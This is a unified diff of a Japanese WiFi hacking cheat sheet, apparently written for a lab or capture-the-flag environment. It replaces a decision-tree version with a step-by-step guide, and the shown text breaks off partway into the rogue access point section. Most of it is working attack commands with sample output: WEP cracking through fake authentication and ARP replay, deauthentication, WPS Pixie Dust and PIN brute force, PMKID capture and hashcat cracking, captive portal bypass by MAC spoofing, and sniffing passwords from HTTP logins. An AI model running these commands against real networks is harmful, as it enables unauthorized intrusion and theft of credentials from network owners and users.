@@ -1,432 +1,378 @@
-# WiFi Wi-Fiハッキングの木
+# WiFi Hacking Tree
 
-**免責事項:** 本コンテンツは教育目的および許可されたセキュリティテストのみを目的としています。所有していないネットワーク、または明示的な書面による許可を得ていないネットワークに対してこれらの技術を使用しないでください。著者は、誤用、損害、または法的結果について一切の責任を負いません。常に適用される法律および規制を遵守してください。
-
----
-
-<a name="master-tree"></a>
-## 1. マスター決定木
-
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│                   開始: WiFi ペネトレーションテスト                    │
-│              目標: AP または Web サーバーからフラグを取得              │
-└─────────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────────┐
-│  ステップ 0: 環境セットアップ                                         │
-│  • airmon-ng check kill                                             │
-│  • モニターインターフェースの作成                                      │
-│  • 周辺ネットワークの調査                                             │
-└─────────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────────┐
-│  ステップ 1: 列挙 (airodump-ng --band abg)                          │
-│  出力: BSSID, CH, ENC, CIPHER, AUTH, WPS, ESSID                     │
-│  クライアント: STATION, Probes, Notes                                │
-└─────────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-        ┌─────────────────────┼─────────────────────┐
-        │                     │                     │
-        ▼                     ▼                     ▼
-   ┌─────────┐          ┌──────────┐         ┌──────────┐
-   │  OPN    │          │   WEP    │         │ WPA2-PSK │
-   │(オープン)│          │ (レガシー)│         │ (暗号化) │
-   └────┬────┘          └────┬─────┘         └────┬─────┘
-        │                     │                    │
-        │                     │                    ├── クライアントあり？
-        │                     │                    │    ├── はい → Deauth + Handshake + Crack
-        │                     │                    │    └── いいえ → PMKID (hcxdumptool)
-        │                     │                    │
-        │                     │                    ├── ネットワーク不在 + Probe あり？
-        │                     │                    │    └── はい → Rogue AP (hostapd-mana)
-        │                     │                    │
-        │                     │                    └── WPS 有効？
-        │                     │                         └── はい → reaver -K 1
-        │                     │
-        │                     ├── アクティブクライアントあり？
-        │                     │    ├── はい → besside-ng (自動)
-        │                     │    └── いいえ → Fake Auth + ARP Replay
-        │                     │
-        │                     └── 手動 WEP:
-        │                          aireplay-ng -1 (Fake Auth)
-        │                          aireplay-ng --arpreplay
-        │                          aircrack-ng
-        │
-        ├── Captive Portal あり？
-        │    ├── はい → MAC Spoofing + HTTP Sniff + Credential
-        │    └── いいえ → 接続 + admin/admin + ルーターフラグ
-        │
-        └── ポストエクスプロイテーション:
-             • airdecap-ng (トラフィック復号)
-             • tshark (Cookie、Credential 抽出)
-             • arp-scan (Client Isolation テスト)
-             • curl -b "cookie" (Session Hijacking)
-
-        ┌─────────────────────┼─────────────────────┐
-        │                     │                     │
-        ▼                     ▼                     ▼
-   ┌─────────┐          ┌──────────┐         ┌──────────────┐
-   │ WPA3-   │          │   MGT    │         │     OWE      │
-   │ SAE     │          │(エンタープライズ)│   │ (Enhanced    │
-   │         │          │          │         │  Open)       │
-   └────┬────┘          └────┬─────┘         └──────┬───────┘
-        │                    │                      │
-        ├── Transition Mode  │                      ├── 直接接続 (key_mgmt=OWE)
-        │   (WPA2+WPA3)?     │                      │   → 99% 成功
-        │   └── はい →        │                      │
-        │   Deauth + Handshake│                     └── 失敗した場合:
-        │   + Crack (WPA2)   │                          DragonDrain (DoS)
-        │                    │                          → リトライ
-        └── WPA3-only?       │
-            └── wacker.py    │
-                (オンライン)  │
-                             │
-                             ├── 1. パッシブ偵察 (攻撃なし):
-                             │   tshark → eap.identity (ユーザー名)
-                             │   tshark → tls.certificate (サーバー証明書)
-                             │   → メール、CN、ドメイン
-                             │
-                             ├── 2. EAP メソッドの特定:
-                             │   tshark -Y "eap" -e eap.type
-                             │   ├── 4  → EAP-MD5 → hcxpcapngtool + hashcat 4800
-                             │   ├── 13 → EAP-TLS → クライアント証明書 (Rogue AP)
-                             │   ├── 21 → EAP-TTLS → eaphammer + asleap
-                             │   ├── 25 → PEAP → eaphammer + asleap
-                             │   ├── 6  → EAP-GTC → gtc-downgrade
-                             │   ├── 18 → EAP-SIM → IMSI 抽出
-                             │   ├── 23 → EAP-AKA → IMSI 抽出
-                             │   └── 50 → EAP-AKA' → IMSI 抽出
-                             │
-                             ├── 3. メソッド別の攻撃:
-                             │   ├── PEAP/TTLS:
-                             │   │   ├── eaphammer --creds → MSCHAPv2
-                             │   │   ├── asleap/hashcat -m 5500
-                             │   │   └── または gtc-downgrade → 平文
-                             │   │
-                             │   ├── EAP-TLS:
-                             │   │   ├── 本物のサーバー証明書あり？
-                             │   │   │   ├── はい → eaphammer --cert-wizard import
-                             │   │   │   └── いいえ → hostapd-wpe (任意の証明書受理)
-                             │   │   ├── CA.key あり？
-                             │   │   │   └── はい → 任意ユーザーの偽証明書生成
-                             │   │   └── 偽証明書で接続 → フラグ
-                             │   │
-                             │   └── Relay (PEAP):
-                             │       berate_ap --wpa-sycophant
-                             │       + wpa_sycophant
-                             │       + 脆弱なクライアントに Deauth
-                             │
-                             ├── 4. オンラインブルートフォース:
-                             │   air-hammer (ユーザー × パス)
-                             │   または air-hammer (ユーザーリスト × 単一パス)
-                             │
-                             └── 5. Evil Twin / フィッシング:
-                                 クライアントが別ネットワークを Probe 中？
-                                 └── eaphammer --captive-portal
-                                     または --hostile-portal
-                                     → hashcat -m 5600 (NetNTLMv2)
-                                     → または POST から平文取得
-```
+> **使用ガイド:** このチートシートは初期セットアップから攻撃の最終段階まで順番に並んでいます。各攻撃には **前提条件 → コマンド → 取得データ → 次のステップ** が含まれます。
 
 ---
 
-<a name="setup"></a>
-## 2. 環境セットアップとツール
+## 🧰 セクション0: 初期セットアップと完全リセット
 
-### 2.1. 無線カードの完全リセット
+### 0.1. 環境の完全リセット（各チャレンジの前）
 
 ```bash
-# 干渉するプロセスを終了
+# 1. 干渉するプロセスを停止
+sudo systemctl stop NetworkManager
 sudo pkill wpa_supplicant
 sudo pkill dhclient
-sudo pkill hostapd
-sudo pkill eaphammer
-sudo pkill aireplay-ng
-sudo pkill airodump-ng
-sudo pkill berate_ap
-sudo pkill dnsmasq
-
-# NetworkManager と airmon をリセット
-sudo systemctl stop NetworkManager
 sudo airmon-ng check kill
 
-# すべての仮想インターフェースを削除
+# 2. すべての仮想モニターインターフェースを削除
 for i in $(iw dev | grep Interface | awk '{print $2}'); do
-    sudo ip link set $i down 2>/dev/null
     sudo iw dev $i del 2>/dev/null
 done
 
-# ドライバをリセット (WiFiChallengeLab の場合: mac80211_hwsim)
+# 3. ドライバをリセット（シミュレータ環境）
 sudo modprobe -r mac80211_hwsim && sleep 2 && sudo modprobe mac80211_hwsim
 
-# NetworkManager を再起動 (オプション)
-sudo systemctl start NetworkManager
+# 4. （任意）準備済みスクリプト
+sudo ~/restartWiFi.sh
 ```
 
-### 2.2. モニターインターフェースの作成
+### 0.2. インターフェースとドライバの確認
 
 ```bash
-# 方法 1: airmon-ng (最も簡単)
-sudo airmon-ng start wlan0
+iw dev                    # インターフェース一覧
+iw phy                    # 物理ラジオ一覧
+iw phy phy0 info          # phy0 の機能
 
-# 方法 2: 手動 (airmon-ng が失敗した場合)
-sudo iw phy phy0 interface add wlan0mon type monitor
-sudo ip link set wlan0mon up
-sudo iw dev wlan0mon set channel 44  # チャンネルが判明している場合
-
-# 確認
-iw dev
-iw dev wlan0mon info   # type monitor が表示されるはず
+# カードのドライバを確認
+readlink /sys/class/net/wlan0/device/driver
+sudo ethtool -i wlan0
+lsusb -t                  # USB の場合
+lspci -k                  # PCI の場合
 ```
 
-### 2.3. 重要な注意: 共有インターフェース
+### 0.3. モニターモードの作成（手動 — 最も確実）
 
-> ⚠️ **重要な警告:** `wlan0mon` が `wlan0` (managed) と同じ `phy` 上にある場合、`hcxdumptool` などのツールは `failed to arm interface` で失敗します。
->
-> **解決策:** 別の `phy` 上に専用のモニターインターフェースを作成します:
-> ```bash
-> # 例: hcxdumptool 用に phy70
-> sudo iw phy phy70 interface add wlan6mon type monitor
-> sudo ip link set wlan6mon up
-> ```
+```bash
+# airmon-ng を使用
+sudo airmon-ng start wlan0
+
+# 手動（airmon が壊れている場合）
+sudo iw phy phy0 interface add wlan0mon type monitor
+sudo ip link set wlan0mon up
+iw dev wlan0mon info      # type monitor と表示されるはず
+```
+
+> ⚠️ **重要な注意:** `hcxdumptool` には必ず **専用** のモニターインターフェース（別の `phy` 上）を使用し、`wlan0` と共有する `wlan0mon` は使わないこと。
+
+### 0.4. Managed インターフェースの管理
+
+```bash
+# 無効化/有効化
+sudo ip link set wlan1 down
+sudo ip link set wlan1 up
+
+# タイプを managed に変更
+sudo iw dev wlan1 set type managed
+
+# インターフェース名の変更
+sudo ip link set wlan0mon down
+sudo ip link set wlan0mon name mymon
+sudo ip link set mymon up
+```
 
 ---
 
-<a name="recon"></a>
-## 3. フェーズ 0: 列挙と偵察
+## 🔍 セクション1: Recon / Enumeration（偵察）
 
-### 3.1. 包括的なスキャン
+### 1.1. 全バンドの包括スキャン
 
 ```bash
+mkdir -p ~/wifi
 sudo airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg
 ```
 
-**重要な AP カラム:**
+| フラグ | 意味 |
+|-----|------|
+| `--band abg` | 2.4GHz (b/g) と 5GHz (a) をスキャン — **これがないと 5GHz ネットワークが表示されない** |
+| `--wps` | WPS の状態を表示 |
+| `--manufacturer` | メーカーを表示 |
+| `-w` | 出力を保存（`.cap`, `.csv` など） |
 
-| カラム | 意味 | 値 |
-|------|------|--------|
-| **BSSID** | ルーター MAC | `F0:9F:C2:...` |
-| **PWR** | 信号強度 | 0 に近いほど強い |
-| **CH** | チャンネル | `1`, `6`, `11`, `44`, `48` |
-| **ENC** | 暗号化 | `OPN`, `WEP`, `WPA2`, `WPA3` |
-| **CIPHER** | アルゴリズム | `CCMP`, `TKIP`, `WEP` |
-| **AUTH** | 認証 | `PSK`, `MGT`, `SAE`, `OWE` |
-| **WPS** | WPS サポート | `0.0` (なし), `2.0` (あり) |
-| **ESSID** | ネットワーク名 | `<length: 9>` = 隠し |
+### 1.2. 重要な出力列 — AP（上の表）
 
-**重要なクライアントカラム:**
+| 列 | 意味 | 用途 |
+|------|---------|-----|
+| **BSSID** | AP の MAC | フィルタリング用ターゲット識別子 |
+| **PWR** | 信号強度（0 に近いほど強い） | 近いターゲットを選ぶ |
+| **CH** | チャンネル | カードを固定する際に **重要** |
+| **ENC** | 暗号化方式: `OPN`/`WEP`/`WPA2`/`WPA3` | 攻撃タイプの決定 |
+| **CIPHER** | `CCMP`（強い）、`TKIP`（弱い）、`WEP` | ターゲットの優先度 |
+| **AUTH** | `PSK` / `MGT` / `SAE` / `OWE` | 戦略の決定 |
+| **WPS** | `0.0` = 無効、`2.0` = 有効 | WPS 攻撃 |
+| **ESSID** | ネットワーク名（`<length: N>` = 隠し） | 識別 |
 
-| カラム | 意味 | 用途 |
-|------|------|--------|
-| **STATION** | クライアント MAC | Deauth ターゲット |
-| **Probes** | 探索中のネットワーク | 🎯 **Evil Twin のための金鉱** |
-| **Notes** | `PMKID` または `WPA handshake` | 成功指標 |
-| `(not associated)` | 未接続 | スキャン中 |
+### 1.3. 重要な出力列 — クライアント（下の表）
 
-### 3.2. 出力の保存と分析
+| 列 | 意味 | 用途 |
+|------|---------|-----|
+| **BSSID** | 接続先 AP | ネットワークの特定 |
+| **STATION** | クライアントの MAC | Deauth/Evil Twin のターゲット |
+| **Probes** | 探索しているネットワーク | Evil Twin に **最適** |
+| **Notes** | `PMKID` または `WPA handshake` | キャプチャ成功の印 |
+| `(not associated)` | 未接続 | フリーなクライアント |
+
+### 1.4. CSV ファイルからの情報抽出
 
 ```bash
-# 出力: scan-01.cap, scan-01.csv, scan-01.kismet.*
-ls ~/wifi/
-
-# CSV を検索
+# 特定のネットワークを検索
 cat ~/wifi/scan-01.csv | grep "wifi-global"
 
-# tshark で抽出
-tshark -r ~/wifi/scan-01.cap -Y "wlan.fc.type_subtype == 4" -T fields -e wlan.sa -e wlan.ssid -e radiotap.channel.freq
+# 出力例:
+# F0:9F:C2:71:22:17, ..., 44, 54, WPA2, CCMP, MGT, -28, ..., wifi-global
+# → BSSID = F0:9F:C2:71:22:17, CH = 44
 ```
 
-### 3.3. 補助偵察ツール
+### 1.5. tshark で Probe を検出
 
 ```bash
-# 1. WiFi_db (SQLITE データベース)
+# Probe Request フレーム（サブタイプ 4）
+tshark -r capture.cap -Y "wlan.fc.type_subtype == 4" \
+  -T fields -e wlan.sa -e wlan.ssid -e radiotap.channel.freq
+
+# 特定のクライアントでフィルタ
+tshark -r capture.cap -Y "wlan.fc.type_subtype == 4 && wlan.sa == 78:c1:a7:bf:72:46" \
+  -T fields -e wlan.ssid
+```
+
+### 1.6. wifi_db でスキャンを DB 化
+
+```bash
+sudo apt install sqlitebrowser -y
 git clone https://github.com/r4ulcl/wifi_db.git
-cd wifi_db
-sudo python3 wifi_db.py -d ~/wifi/wifichallenge.SQLITE ~/wifi/
-sudo sqlitebrowser ~/wifi/wifichallenge.SQLITE
-
-# 2. wash (WPS チェック)
-sudo wash -i wlan0mon -c <CH>
-
-# 3. iw scan (RSN Capabilities - PMF チェック)
-sudo iw dev wlan2 scan | grep -A 20 "wifi-IT" | grep -A 6 "RSN"
+cd /root/tools/wifi_db
+sudo python3 wifi_db.py -d /home/user/wifi/wifichallenge.SQLITE /home/user/wifi
+sudo sqlitebrowser /home/user/wifi/wifichallenge.SQLITE
 ```
 
-### 3.4. RSN Capabilities の解釈 (MFP/PMF 検出)
-
-```
-RSN Capabilities: 0x008c = 0000 0000 1000 1100
-                    │                ││││
-                    │                │││└── bit 2: 16-PTKSA-RC
-                    │                ││└─── bit 3: 1-GTKSA-RC  
-                    │                └┴──── bit 6,7: MFPR/MFPC
+```sql
+SELECT * FROM AP;
+SELECT * FROM Client;
 ```
 
-| MFPC (bit 7) | MFPR (bit 6) | 意味 | Deauth は効く？ |
-|:---:|:---:|------|:---:|
-| 0 | 0 | PMF 無効 | ✅ はい |
-| 1 | 0 | PMF オプション | ✅ はい (MFP 非対応クライアントに対して) |
-| 1 | 1 | PMF 必須 | ❌ いいえ |
+### 1.7. airodump-ng の出力ファイル
+
+| ファイル | 用途 |
+|------|-----|
+| **`scan-01.cap`** | メインファイル — Wireshark/aircrack |
+| `scan-01.csv` | プレーンテキスト — grep |
+| `scan-01.kismet.csv` | Kismet 出力 |
+| `scan-01.kismet.netxml` | Kismet XML |
+| `scan-01.log.csv` | イベントログ |
 
 ---
 
-<a name="opn"></a>
-## 4. フェーズ 1: OPN ブランチ (オープンネットワーク)
+## 🌐 セクション2: OPN（オープン）ネットワークへの攻撃
 
-```
-OPN (ENC = OPN)
-│
-├── Captive Portal あり？
-│   │
-│   ├── はい → MAC Spoofing + HTTP Sniff
-│   │   ├── 1. スキャンして有効なクライアント MAC を発見
-│   │   ├── 2. macchanger -m <CLIENT_MAC> wlan2
-│   │   ├── 3. wpa_supplicant (key_mgmt=NONE)
-│   │   ├── 4. dhclient (IP 取得)
-│   │   ├── 5. airodump-ng -c <CH> -w capture
-│   │   ├── 6. Wireshark → http.request.method == POST
-│   │   └── 7. ユーザー/パス抽出 → ログイン → フラグ
-│   │
-│   └── いいえ → 直接接続
-│       ├── wpa_supplicant → dhclient
-│       ├── ip route (ゲートウェイを発見)
-│       └── http://<gateway> → admin/admin → フラグ
-```
+### 2.1. オープンネットワークへの接続（最も簡単）
 
-### 4.1. オープンネットワーク設定
-
+**ステップ1: 設定ファイル作成**
 ```conf
-# free.conf
+# ~/wifi/open.conf
 network={
     ssid="wifi-free"
     key_mgmt=NONE
-    scan_ssid=1
+    scan_ssid=1        # 隠しネットワークの場合
 }
 ```
 
-### 4.2. 接続コマンド
-
+**ステップ2: 接続**
 ```bash
-# 接続
-sudo wpa_supplicant -Dnl80211 -iwlan2 -c free.conf -B
-
-# IP 取得
-sudo dhclient wlan2 -v
-
-# 確認
-ip a show wlan2
-ip route | grep default
+sudo pkill wpa_supplicant
+sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/open.conf
 ```
 
-### 4.3. MAC Spoofing による Captive Portal バイパス
+**ステップ3: IP の取得**
+```bash
+sudo dhclient wlan2 -v
+# 出力: bound to 192.168.16.84 from 192.168.16.1
+# → ゲートウェイ = 192.168.16.1
+```
+
+**ステップ4: ゲートウェイの特定**
+```bash
+ip route
+# または
+ip a show wlan2
+```
+
+**ステップ5: ルーターパネルへのアクセス**
+```bash
+firefox http://192.168.16.1
+# admin/admin、admin/password、admin/1234 などを試す
+```
+
+---
+
+### 2.2. MAC スプーフィングによる Captive Portal の回避
+
+**戦略:** ログインページは MAC に基づいて判断する → 有効なクライアントの MAC を偽装 → ログインなしで侵入。
+
+**ステップ1: トラフィックのキャプチャとアクティブクライアントの特定**
+```bash
+sudo airodump-ng wlan0mon -w ~/wifi/scanc6 --manufacturer --wps -c6
+# Frames 列 → 最も多い = 最もアクティブなクライアント（有効）
+# 例: B0:72:BF:44:B0:49 は 232 フレーム
+```
+
+**ステップ2: ネットワークへの初期接続**
+```bash
+sudo pkill wpa_supplicant
+sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/open.conf
+sudo dhclient wlan2 -v
+```
+
+**ステップ3: MAC の偽装**
 
 ```bash
-# 1. airodump-ng からアクティブなクライアント MAC を発見
-# (Frames の多い STATION カラム)
+# NetworkManager を停止
+sudo systemctl stop NetworkManager
 
-# 2. NetworkManager を停止して MAC を変更
-sudo systemctl stop network-manager
+# インターフェースを down、MAC 変更、up
 sudo ip link set wlan2 down
 sudo macchanger -m b0:72:bf:44:b0:49 wlan2
 sudo ip link set wlan2 up
 
-# 3. 再接続 (MAC が許可リストにあればログイン不要)
-sudo wpa_supplicant -Dnl80211 -iwlan2 -c free.conf -B
-sudo dhclient wlan2 -v
+# wpa_supplicant がスタックした場合:
+sudo pkill wpa_supplicant
+sudo ip link set wlan2 down && sleep 2
+sudo ip link set wlan2 up && sleep 2
 ```
 
-### 4.4. HTTP スニッフィングと認証情報の抽出
+**ステップ4: 再接続**
+```bash
+sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/open.conf
+sudo dhclient -v wlan2
+```
+
+**ステップ5: HTTP を盗聴して認証情報を抽出**
 
 ```bash
-# ターゲットチャンネルでキャプチャ
-sudo airodump-ng wlan0mon -c 6 -w ~/wifi/capture
+# トラフィックが蓄積するまで 3〜5 分待つ
+sudo airodump-ng wlan0mon -w ~/wifi/scanc6 --manufacturer --wps -c6
+```
 
-# ユーザーログインを待つ (3〜5 分)
-
-# Wireshark で分析
-wireshark ~/wifi/capture-01.cap
-# フィルター: http.request.method == "POST"
-
-# または tshark で
-tshark -r ~/wifi/capture-01.cap -Y "http.request.method == \"POST\"" -T fields -e http.file_data
+**ステップ6: Wireshark で分析**
+```bash
+wireshark ~/wifi/scanc6-01.cap
+# フィルタ: http.request.method == "POST"
+# または: http contains "Password"
 ```
 
 **出力例:**
 ```
-Username=free1&Password=Jyl1iq8UajZ1fEK&Submit=Login
+Form item: "Username" = "free1"
+Form item: "Password" = "Jyl1iq8UajZ1fEK"
+```
+
+**ステップ7: 窃取した認証情報でログイン**
+```bash
+firefox http://<gateway>
+# username: free1, password: Jyl1iq8UajZ1fEK
 ```
 
 ---
 
-<a name="wep"></a>
-## 5. フェーズ 2: WEP ブランチ
+## 🐌 セクション3: WEP への攻撃
 
-```
-WEP (ENC = WEP)
-│
-├── 自動化メソッド (最速)
-│   └── besside-ng -c <CH> -b <BSSID> wlan2 -v
-│       (Fake Auth + ARP Replay + IV 収集 + クラックを実行)
-│
-└── 手動メソッド (besside-ng が失敗した場合)
-    │
-    ├── 1. データキャプチャ
-    │   └── airodump-ng -c <CH> --bssid <BSSID> -w ~/wifi/wep wlan0mon
-    │
-    ├── 2. Fake Auth
-    │   └── aireplay-ng -1 3600 -q 10 -a <BSSID> wlan0mon
-    │
-    ├── 3. ARP Replay
-    │   └── aireplay-ng --arpreplay -b <BSSID> -h <YOUR_MAC> wlan0mon
-    │
-    ├── 4. IV 収集を待つ (20,000〜50,000)
-    │
-    ├── 5. クラック
-    │   └── aircrack-ng ~/wifi/wep-01.cap
-    │
-    └── 6. 接続
-        └── wpa_supplicant with wep_key0
+### 3.1. 理論的背景 — WEP がなぜ破られるか
+
+- WEP は **RC4** を使用。
+- 各パケットに **IV**（24ビット）+ キー = Keystream。
+- IV は 24 ビットのみ → 約 1600 万通り → 十分な IV（20〜50k）を集めれば **FMS/PTW Attack** でキーを突破できる。
+- `aircrack-ng` が統計解析を自動で行う。
+
+### 3.2. AUTO メソッド — `besside-ng`（最速）
+
+**ステップ1: 準備**
+```bash
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+sudo airodump-ng wlan0mon --band abg -w ~/wifi/scan7
+# wifi-old の BSSID とチャンネルを取得（例: CH=3）
 ```
 
-### 5.1. besside-ng による自動化メソッド
-
+**ステップ2: 自動攻撃の実行**
 ```bash
 sudo besside-ng -c 3 -b F0:9F:C2:71:22:11 wlan2 -v
 ```
 
-**成功時の出力:**
+> ⚠️ 注意: `besside-ng` は **モニターモード** のインターフェース（自分で monitor にした `wlan2`）で動作し、airmon が作った `wlan0mon` ではない。
+
+**何が起こるか？**
+1. 自動 Fake Auth
+2. Association
+3. ARP Replay
+4. 約 4 分で 30,000+ IV を収集
+5. 自動クラック
+
+**ステップ3: ログからキーを読む**
 ```
 [02:35:38] Got key for wifi-old [11:bb:33:cd:55] 30044 IVs
 [02:35:38] Pwned network wifi-old in 4:22 mins:sec
 ```
+→ **KEY = `11:bb:33:cd:55`**
 
-### 5.2. 手動メソッド (ステップバイステップ)
+---
+
+### 3.3. MANUAL メソッド — ステップバイステップ
+
+#### ステップ1: ターゲットのトラフィックをキャプチャ
 
 ```bash
-# 1. キャプチャ
-sudo airodump-ng -c 3 --bssid F0:9F:C2:71:22:11 -w ~/wifi/wifi-old wlan0mon
-
-# 2. Fake Auth (ターミナル 2)
-sudo aireplay-ng -1 3600 -q 10 -a F0:9F:C2:71:22:11 wlan0mon
-
-# 3. ARP Replay (ターミナル 3)
-sudo aireplay-ng --arpreplay -b F0:9F:C2:71:22:11 -h BA:49:A9:53:A1:8C wlan0mon
-
-# 4. ARP がない場合、Deauth を送信
-sudo aireplay-ng --deauth 5 -a F0:9F:C2:71:22:11 -c <CLIENT_MAC> wlan0mon
-
-# 5. クラック
-sudo aircrack-ng ~/wifi/wifi-old-01.cap
+sudo airodump-ng -c 3 --bssid F0:9F:C2:71:22:11 \
+  -w ~/wifi/wifi-old wlan0mon
 ```
 
-### 5.3. WEP に接続
+> `#Data` 列 = 収集した IV の数。**目標: 20,000〜50,000**
+
+#### ステップ2: Fake Authentication（AP に自分を紹介）
+
+```bash
+sudo aireplay-ng -1 3600 -q 10 -a F0:9F:C2:71:22:11 wlan0mon
+```
+
+| フラグ | 意味 |
+|-----|------|
+| `-1 3600` | 3600 秒ごとに再認証 |
+| `-q 10` | 10 秒ごとに Keep-Alive |
+| `-a` | ターゲット BSSID |
+
+> **なぜ？** AP は Associate したクライアントとしか通信しない。WEP は Open Auth で動作するため、パスワードは不要。
+
+#### ステップ3: ARP Replay（人工トラフィックの生成）
+
+```bash
+sudo aireplay-ng --arpreplay -b F0:9F:C2:71:22:11 \
+  -h BA:49:A9:53:A1:8C wlan0mon
+```
+
+| フラグ | 意味 |
+|-----|------|
+| `--arpreplay` | キャプチャした ARP を注入 |
+| `-b` | ターゲット BSSID |
+| `-h` | 自分の MAC（偽のクライアント） |
+
+> **なぜ？** AP がより速くパケットを送信 → より多くの IV が生成される。
+
+#### ステップ3.5（任意）: トラフィックを刺激する Deauth
+
+```bash
+sudo aireplay-ng --deauth 5 -a F0:9F:C2:71:22:11 \
+  -c 64:32:A8:56:32:56 wlan0mon
+```
+
+#### ステップ4: キーのクラック
+
+```bash
+sudo aircrack-ng ~/wifi/wifi-old-01.cap
+# 出力: KEY FOUND! [ 11:bb:33:cd:55 ]
+```
+
+#### ステップ5: WEP 設定の作成と接続
 
 ```conf
-# wep.conf
+# ~/wifi/wep.conf
 network={
     ssid="wifi-old"
     key_mgmt=NONE
@@ -436,102 +382,271 @@ network={
 ```
 
 ```bash
-sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/wep.conf -B
+sudo pkill wpa_supplicant
+sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/wep.conf
 sudo dhclient wlan2 -v
+ip route
+# ルーターの Web サーバーにアクセスしてフラグを取得
 ```
 
-### 5.4. ライトアップに含まれない WEP 攻撃 (ただし重要!)
+### 3.4. 補足の WEP 攻撃（Writeup にはないが重要）
 
-| 攻撃 | ツール | 用途 |
-|------|-------|--------|
-| **Fragmentation** | `aireplay-ng -5` | ARP なしで IV 生成 |
-| **ChopChop** | `aireplay-ng -4` | ARP なしでクラック |
-| **KoreK** | `aircrack-ng -K` | レガシー手法 |
-| **PTW** | `aircrack-ng` (デフォルト) | 最速手法 |
+| 攻撃 | コマンド | 用途 |
+|------|-------|-----|
+| **Fragmentation** | `aireplay-ng -5 -b <BSSID> -h <MAC> wlan0mon` | ARP なしで IV を生成 |
+| **ChopChop** | `aireplay-ng -4 -b <BSSID> -h <MAC> wlan0mon` | ARP なしでパケットをクラック |
+| **KoreK** | `aircrack-ng -K capture.cap` | 古い WEP クラック手法 |
 
 ---
 
-<a name="wpa2"></a>
-## 6. フェーズ 3: WPA2-PSK ブランチ
+## 🔑 セクション4: WPS への攻撃
 
-```
-WPA2-PSK (ENC=WPA2, AUTH=PSK)
-│
-├── 接続中のクライアントあり？
-│   │
-│   ├── はい → Deauth + Handshake + Crack
-│   │   ├── 1. airodump-ng -c <CH> --bssid <BSSID> -w capture
-│   │   ├── 2. aireplay-ng -0 10 -a <BSSID> -c <CLIENT>
-│   │   ├── 3. [WPA handshake: ...] を待つ
-│   │   ├── 4. aircrack-ng capture-01.cap -w rockyou.txt
-│   │   └── 5. 接続 + airdecap-ng + ポストエクスプロイト
-│   │
-│   ├── いいえ → PMKID 攻撃 (クライアントレス)
-│   │   ├── hcxdumptool -i wlan6mon -w pmkid.pcapng -c <CH>a --rds=2 -A
-│   │   ├── hcxpcapngtool -o pmkid.22000 pmkid.pcapng
-│   │   └── hashcat -m 22000 -a 0 pmkid.22000 rockyou.txt
-│   │
-│   └── ネットワーク不在 + クライアント Probe あり？
-│       └── Rogue AP (hostapd-mana)
-│           ├── hostapd-mana with essid=target, wpa_passphrase=12345678
-│           ├── mana_wpaout=hostapd.hccapx
-│           ├── クライアントに Deauth
-│           ├── hashcat -m 22000 hostapd.hccapx
-│           └── 接続
-│
-└── WPS 有効？ (WPS カラム = 2.0)
-    └── WPS ブランチへ
-```
+### 4.1. WPS が危険な理由
 
-### 6.1. Handshake のキャプチャ
+- 8 桁の PIN は **4 桁ずつの 2 つの半分** に分割される。
+- AP は各半分を別々にチェック → **20,000** 通りだけ（1 億通りではない）。
+- 一部の AP は **Pixie Dust** に脆弱（数秒でクラック）。
+
+### 4.2. アクティブな WPS の特定
 
 ```bash
-# 1. ターゲットチャンネルにロック
-sudo airodump-ng wlan0mon -c 6 --bssid F0:9F:C2:71:22:12 -w ~/wifi/psk
+# 方法1: airodump の出力（WPS 列）
+# 0.0 以外の数字 = WPS 有効
 
-# 2. 別ターミナルで Deauth
-sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:12 -c <CLIENT_MAC> wlan0mon
-
-# 3. airodump の上部に成功メッセージが表示されるのを待つ:
-# [ WPA handshake: F0:9F:C2:71:22:12 ]
-
-# 4. クラック
-aircrack-ng ~/wifi/psk-01.cap -w /root/rockyou-top100000.txt
+# 方法2: wash
+sudo wash -i wlan0mon -c 8
 ```
+
+**出力例:**
+```
+BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
+F0:9F:C2:71:22:13    8  -30  2.0  No             wifi-event
+```
+→ **WPS=2.0（有効）、Lck=No（ロックなし）✅**
+
+> 🔒 `Lck: Yes` の場合: `-L` フラグで無視、`bully` を試す、または待つ。
+
+### 4.3. 方法1 — Pixie Dust（最速）
+
+```bash
+sudo reaver -i wlan0mon -b F0:9F:C2:71:22:13 -c 8 -vv -K 1
+```
+
+| フラグ | 意味 |
+|-----|------|
+| `-i` | モニターインターフェース |
+| `-b` | ターゲット BSSID |
+| `-c` | チャンネル |
+| `-vv` | verbose |
+| `-K 1` | Pixie Dust モード |
+
+### 4.4. 方法2 — PIN ブルートフォース（Pixie Dust 失敗時）
+
+```bash
+sudo reaver -i wlan0mon -b F0:9F:C2:71:22:13 -c 8 -vv -S -N -L
+```
+
+| フラグ | 意味 |
+|-----|------|
+| `-S` | 小さな DH キー（高速化） |
+| `-N` | NACK なし |
+| `-L` | WPS ロックを無視 |
 
 **成功時の出力:**
 ```
-KEY FOUND! [ starwars1 ]
+WPS PIN: 12345670
+WPA PSK: @MegaPSKP@ssword!@
+AP SSID: wifi-event
 ```
 
-### 6.2. PMKID 攻撃 (クライアントレス)
-
-```bash
-# 1. 専用のモニターインターフェースを作成 (重要!)
-sudo iw phy phy70 interface add wlan6mon type monitor
-sudo ip link set wlan6mon up
-sudo iw dev wlan6mon set channel 7
-
-# 2. hcxdumptool を実行
-sudo hcxdumptool -i wlan6mon -w pmkid.pcapng -c 7a --rds=2 -A
-
-# 3. ハッシュを抽出
-hcxpcapngtool -o pmkid.22000 pmkid.pcapng
-
-# 4. クラック
-hashcat -m 22000 -a 0 pmkid.22000 /root/rockyou-top100000.txt --force
-```
-
-### 6.3. 不在ネットワーク用の Rogue AP (hostapd-mana)
-
-**シナリオ:** `wifi-offices` ネットワークは利用不可だが、クライアントはまだ Probe Request を送信している。
-
-```bash
-# 1. hostapd-mana の設定
-nano hostapd.conf
